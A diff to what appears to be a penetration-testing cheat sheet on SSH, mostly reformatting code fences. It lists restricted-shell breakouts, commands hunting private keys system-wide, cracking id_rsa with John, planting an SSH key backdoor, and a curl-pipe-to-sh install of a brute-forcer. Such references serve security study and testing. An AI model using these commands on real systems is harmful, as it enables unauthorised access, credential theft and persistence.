@@ -18,10 +18,9 @@ nav_order: 4-2
 If you have access to the <i>echo</i> command it is possible to use the built-in API to break out:
 ``` echo os.system("/bin/bash")```
 Break out of <b> RBash </b>:
-``` ssh restricted@$IP -p 31678 -t "bash --noprofile"
+``` ssh restricted@$IP -p 31678 -t "bash --noprofile" ```
 OR
-ssh user@$IP "/bin/sh"
-```
+```ssh user@$IP "/bin/sh"```
 
 #### Check the following locations for private keys:
 <ul>
@@ -43,35 +42,26 @@ Check the following locations:
 
 #### Command Reference
 <b> Search for files containing SSH Keys:</b>
-```
-grep -ir "-----BEGIN RSA PRIVATE KEY-----" /home/*
-grep -ir "BEGIN DSA PRIVATE KEY" /*
-```
+```grep -ir "-----BEGIN RSA PRIVATE KEY-----" /home/*```
+```grep -ir "BEGIN DSA PRIVATE KEY" /*```
 <b> SSH with id_rsa </b>
 ``` ssh -i id_rsa user@$IP ```
 <b> Crack id_rsa with John (SSH2John) </b>
 ``` ssh2john id_rsa > crackthis
-john crackthis --wordlist=/usr/share/wordlists/rockyou.txt
-```
+john crackthis --wordlist=/usr/share/wordlists/rockyou.txt```
 <b> SSH Keygen & Back Door (post exploitation) </b>
 Generate a new SSH key pair with:
-```
-ssh-keygen -b 2048 -t rsa -f ~/.ssh/new-key-name
-chmod 600 new-key-name
-```
+```ssh-keygen -b 2048 -t rsa -f ~/.ssh/new-key-name
+chmod 600 new-key-name```
 Drop the 'new-key-name.pub' file into the target /home/usr/.ssh directory.
 Connect with:
-```
-ssh -i new-key-name user@$IP
-```
+```ssh -i new-key-name user@$IP```
 
 ### Tools
 - <a href="https://github.com/pwnesia/ssb"> Secure Shell Bruteforcer (SSB) </a>
 ```curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin ```
-```
-ssb [-p port] [-w wordlist.txt] [-t timeout]
-      [-c concurrent] [-r retries] [-o output] [user@]hostname
-```
+```ssb [-p port] [-w wordlist.txt] [-t timeout]
+      [-c concurrent] [-r retries] [-o output] [user@]hostname```
 
 #### SSH Log Poisoning
 RCE via SSH Log Poisoning:
